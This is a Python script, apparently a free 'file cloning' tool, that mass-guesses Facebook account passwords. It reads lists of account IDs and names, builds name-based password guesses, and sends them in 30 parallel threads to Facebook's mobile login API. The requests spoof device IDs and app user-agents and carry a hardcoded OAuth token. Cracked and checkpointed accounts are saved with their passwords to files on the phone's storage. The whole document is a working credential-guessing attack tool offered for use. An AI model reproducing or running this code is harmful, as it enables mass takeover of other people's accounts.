#sc by b.mohamed#
from os import path
import os,base64,zlib,pip,urllib
print('\033[1;32m') 
os.system(' pip uninstall requests  ; pip install requests') 
print('\033[1;32m') 
print('\n\033[1;32m[=]\033[1;37m\033[1;32m FREE TOOL ENJOY... ')


try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
        os.system('python POWER.py')
except:pass
        
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
gt = random.choice(['GTGT-I9190','KOT49H','GT-I9192','KOT49H','GT-I9300I','KTU84P','GT-I9300','IMM76D','GT-I9300','JSS15J','GT-I9301I','KOT4','GT-I9301I','KOT49H','GT-I9500','JDQ39','GT-I9500','LRX22C','GT-N5100','JZO54K','GT-N7100','KOT49H','GT-N8000','JZO54K','GT-N8000','KOT49H','GT-P3110','JZO54K','GT-P5100','IML74K','GT-P5100','JDQ','GT-P5100','JDQ39','GT-P5100','JZO54K','GT-P5110','JDQ39','GT-P5200','KOT49H','GT-P5210','KOT49H','GT-P5220','JDQ39','GT-S7390','JZO54K','SAMSUNG','SM-A500F','SAMSUNG','SM-G532F','SAMSUNG','SM-G920F','SAMSUNG','SM-G935F','SAMSUNG','SM-J320F','SAMSUNG','SM-J510FN','SAMSUNG','SM-N920S','SAMSUNG','SM-T280','SM-A500FU','MMB29M','SM-A500F','LRX22G','SM-A500F','MMB29M','SM-A500H','MMB29M','SM-G900F','KOT49H','SM-G920F','MMB29K','SM-G920F','NRD90M','SM-G930F','NRD90M','SM-G935F','MMB29K','SM-G935F','NRD90M','SM-G950F','NRD90M','SM-J320FN','LMY47V','SM-J320F','LMY4','SM-J320F','LMY47V','SM-J320H','LMY47V','SM-J320M','LMY47V','SM-J510FN','MMB29M','SM-J510FN','NMF2','SM-J510FN','NMF26X','SM-J510FN','NMF26X;','SM-J701F','NRD90M;','SM-T111','JDQ39','SM-T230','KOT49H','SM-T231','KOT49H','SM-T235','KOT4''SM-T310','KOT49H','SM-T311','KOT4','SM-T311','KOT49H','SM-T315','JDQ39','SM-T525','KOT49H','SM-T531','KOT49H','SM-T531','LRX22G','SM-T535','LRX22G','SM-T555','LRX22G','SM-T561','KTU84P','SM-T705','LRX22G','SM-T705','LRX22G','SM-T805','LRX22G','SM*T820','NRD90M','SPH-L720','KOT49H','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919SGT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
modlll = random.choice(['vivo 1920','2209116AG','SM-A235F','SM-F936B','SM-A525F','SM-G3518','U319AA','SM-A716U']) 

#---------------UA METHOD-----------#
#its working and updated try
def UA():           
    a = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))
    a1 = ";Dalvik/2.1.0 (Linux; U; Android 13; SM-A716U Build/TP1A.220624.014) [FBAN/Orca- Android;FBAV/422.0.0.18.107;FBPN/com.facebook.orca;FBLC/en_US;FBBV/505323571;FBCR/AT&amp;amp- T;FBMF/samsung;FBBD/samsung;FBDV/SM-A716U;FBSV/13;FBCA/arm64- v8a:null;FBDM/{density=3.375,width=1080,height=2147};FB_FW/1;]"
    a2 = ";Dalvik/2.1.0 (Linux; U; Android 13; SM-S901U Build/TP1A.220624.014) [FBAN/Orca-Android;FBAV/421.0.0.12.61;FBPN/com.facebook.orca;FBLC/en_US;FBBV/502432091;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-S901U;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2115};FB_FW/1;]"
    a3 = ";Dalvik/2.1.0 (Linux; U; Android 12; SM-A217F Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/422.0.0.18.107;FBPN/com.facebook.orca;FBLC/pt_PT;FBBV/505323569;FBCR/Unitel STP;FBMF/samsung;FBBD/samsung;FBDV/SM-A217F;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1532};FB_FW/1;]"
    a4 = ";Dalvik/2.1.0 (Linux; U; Android 12; TECNO KI5k Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/377.0.0.13.101;FBPN/com.facebook.orca;FBLC/en_US;FBBV/396116327;FBCR/MTN;FBMF/TECNO;FBBD/TECNO;FBDV/TECNO KI5k;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1444};FB_FW/1;]"
    a5 = ";Dalvik/2.1.0 (Linux; U; Android 13; SM-S134DL Build/TP1A.220624.014) [FBAN/Orca-Android;FBAV/405.0.0.16.112;FBPN/com.facebook.orca;FBLC/en_US;FBBV/466674869;FBCR/&amp;#160-;FBMF/samsung;FBBD/samsung;FBDV/SM-S134DL;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=1.875,width=720,height=1465};FB_FW/1;]"
    ua = a+a1+a2+a3+a4+a5
    return ua

modlll = random.choice(['vivo 1920','2209116AG','SM-A235F','SM-F936B','SM-A525F','SM-G3518','U319AA','SM-A716U']) 
#------------------------------------------------#
logo=("""\033[1;32m
PPPPPP   OOOOO  WW      WW EEEEEEE RRRRRR  
PP   PP OO   OO WW      WW EE      RR   RR 
PPPPPP  OO   OO WW   W  WW EEEEE   RRRRRR  
PP      OO   OO  WW WWW WW EE      RR  RR  
PP       OOOO0    WW   WW  EEEEEEE RR   RR 
\033[1;37m================\033[1;37m===========\033[1;37m================
               \033[1;32mVERISION\033[1;31m : \033[1;32m1.0.0
\033[1;37m================\033[1;37m===========\033[1;37m================
 \033[1;32m[=]\033[1;37m DEVLOPER \033[1;31m: \033[1;32mENKNOW ! 
 \033[1;32m[=]\033[1;37m FACEBOOK \033[1;31m: \033[1;32mENKNOW !
 \033[1;32m[=]\033[1;37m STATE \033[1;31m   : \033[1;32mFREE
 \033[1;32m[=]\033[1;37m TIPE\033[1;31m     : \033[1;32mFILE CLONE
\033[1;37m================\033[1;37m===========\033[1;37m================""")
def linex():
        print('\033[1;37m================\033[1;37m===========\033[1;37m================')
def clear():
        os.system('clear')
        print(logo)
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]


def menu():
        try:
                clear()
        
                x = ("sex")
                if x == ("sex"):
                        print(' \033[1;32m[1] \033[1;37mFile cloning\n \033[1;32m[2] \033[1;37mCrate File\n \033[1;32m[2] \033[1;37mAdmin Contact \n \033[1;32m[0] \033[1;37mExit ')
                        linex()
                        xd=input('\033[1;32m [=] \033[1;37mCHOSE \033[1;31m:\033[1;32m  ')
                        if xd in ['1','01']:
                                clear()
                                print('\033[1;32m [=]\033[1;37m Put file example \033[1;31m:\033[1;32m /sdcard/File.txt ')
                                linex()
                                file = input('\033[1;32m [=]\033[1;37m Put file path\033[1;31m :\033[1;32m ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print('\033[1;32m [=]\033[1;37m File location not found ')
                                        time.sleep(1)
                                        menu()
                                clear()                             
                                plist = []
                                try:
                                        ps_limit = int(input('\033[1;32m [=]\033[1;37m How many passwords do you want to add ? '))
                                except:
                                        ps_limit =1
                                linex()
                                print('\033[1;32m [=]\033[1;37m Exp\033[1;31m : \033[1;37mFirst last,firtslast,first123')
                                linex()
                                for i in range(ps_limit):
                                        plist.append(input(f'\033[1;32m [=]\033[1;37m PASSWORD {i+1}\033[1;31m:\033[1;32m '))                         
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        print('\033[1;32m [=]\033[1;37m TOTAL IDS \033[1;31m: \033[1;32m'+total_ids+f' ')                                        
                                        print("\033[1;32m [=]\033[1;37m USE MODE AVION AVRY 3 MINUT ")
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist                                                                                                                                                     
                                                crack_submit.submit(api1,ids,names,passlist)
                                print('\033[1;37m')
                                linex()
                                print('\033[1;32m [=]\033[1;37m The process has completed')
                                print('\033[1;32m [=]\033[1;37m Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                                linex()
                                input('\033[1;32m [=]\033[1;37m Press enter to back ')
                                os.system('python POWER.py')
                        elif xd in ['2','02']:
                                import dump
                                dump.Main()
                        elif xd in ['3','03']:
                                os.system('xdg-open https://www.facebook.com/profile.php?id=100081014890502')
                        elif xd in ['0','00']:
                        	    exit() 
                        
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
                print('\n No internet connection ...')
                exit()
#--------------- METHOD-----------#
def api1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [\033[1;32mPOWER-XD\033[1;37m] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                gtt=random.choice(gt)
                                gttt=random.choice(modlll)
                                android_version=str(random.randrange(6,13))                                
                                ua_string = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+'Dalvik/2.1.0 (Linux; U; Android 13; SM-F936B Build/TP1A.220624.014) [FBAN/Orca-Android;FBAV/440.0.0.30.352;FBPN/com.facebook.orca;FBLC/en_AU;FBBV/554361140;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-F936B;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=904,height=2103};FB_FW/1;]'+'Dalvik/2.1.0 (Linux; U; Android 12; SM-A235F Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/440.0.0.30.352;FBPN/com.facebook.orca;FBLC/en_US;FBBV/554361140;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-A235F;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=2.8125,width=1080,height=2199};FB_FW/1;]'+'Dalvik/2.1.0 (Linux; U; Android 12; SM-A525F Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/439.0.0.29.119;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/548243065;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-A525F;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2186};FB_FW/1;]'+'Dalvik/2.1.0 (Linux; U; Android 12; SM-A235F Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/436.0.0.45.111;FBPN/com.facebook.orca;FBLC/fr_GN;FBBV/541554436;FBCR/Orange GN;FBMF/samsung;FBBD/samsung;FBDV/SM-A235F;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=2.8125,width=1080,height=2207};FB_FW/1;]'+'Dalvik/2.1.0 (Linux; U; Android 11; U319AA Build/RP1A.200720.011) [FBAN/FB4A;FBAV/407.0.0.30.97;FBPN/com.facebook.katana;FBLC/en_US;FBBV/458543263;FBCR/AT&amp;amp- T;FBMF/TINNO;FBBD/ATT;FBDV/U319AA;FBSV/11;FBCA/armeabi- v7a:armeabi;FBDM/{density=1.875,width=720,height=1350};FB_FW/1;FBRV/0;]'+'Dalvik/2.1.0 (Linux; U; Android 13; SM-F936B Build/TP1A.220624.014) [FBAN/Orca-Android;FBAV/440.0.0.30.352;FBPN/com.facebook.orca;FBLC/en_AU;FBBV/554361140;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-F936B;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=904,height=2103};FB_FW/1;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'source':'login','format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "locale":"es_CU","client_country_code":"CU",
                                        'device':gtt,
                                        'device_id':adid,
                                        "method": "auth.login",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-type':'unknown',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent': ua_string,
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'x-fb-friendly-name':'authenticate',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [POWER-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/POWER-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error']['message']:                                   
                                                #print('\r\r\x1b[38;5;208m [POWER-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/POWER-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break                                        
                                                open('/sdcard/POWER-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass

try:
        menu()
except requests.exceptions.ConnectionError:
        print('\n No internet connection ...')
        exit()
except Exception as e:pass
menu()
